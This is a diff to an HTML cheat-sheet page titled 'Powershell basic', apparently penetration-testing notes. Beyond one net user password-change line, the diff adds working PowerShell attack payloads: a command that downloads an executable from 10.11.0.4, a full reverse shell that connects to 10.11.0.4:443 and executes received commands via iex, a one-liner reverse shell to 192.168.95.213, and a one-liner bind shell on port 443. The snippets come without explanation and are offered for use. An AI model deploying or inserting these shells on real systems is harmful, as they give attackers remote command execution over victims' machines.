@@ -5,4 +5,42 @@
 <title>Powershell basic</title>
 </head><body><b>Change Password</b><br/>
 <br/>
-net user &lt;username&gt; &lt;password&gt;</body></html>
+net user &lt;username&gt; &lt;password&gt;<br/>
+<br/>
+<br/>
+<b>Download file</b><br/>
+<br/>
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\test\Desktop\wget.exe')" &nbsp;<br/>
+<br/>
+<br/>
+<br/>
+<b>Reverse Shell</b><br/>
+<br/>
+$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);<br/>
+$stream = $client.GetStream();<br/>
+[byte[]]$bytes = 0..65535|%{0};<br/>
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)<br/>
+{<br/>
+&nbsp; &nbsp; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);<br/>
+&nbsp; &nbsp; $sendback = (iex $data 2&gt;&amp;1 | Out-String );<br/>
+&nbsp; &nbsp; $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';<br/>
+&nbsp; &nbsp; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);<br/>
+&nbsp; &nbsp; $stream.Write($sendbyte,0,$sendbyte.Length);<br/>
+&nbsp; &nbsp; $stream.Flush();<br/>
+}<br/>
+$client.Close();<br/>
+<br/>
+<br/>
+<b>one liner reverse shell<br/>
+</b><br/>
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.95.213',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"<br/>
+<br/>
+<br/>
+<b>one liner bind shell</b><br/>
+<br/>
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &nbsp;= $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
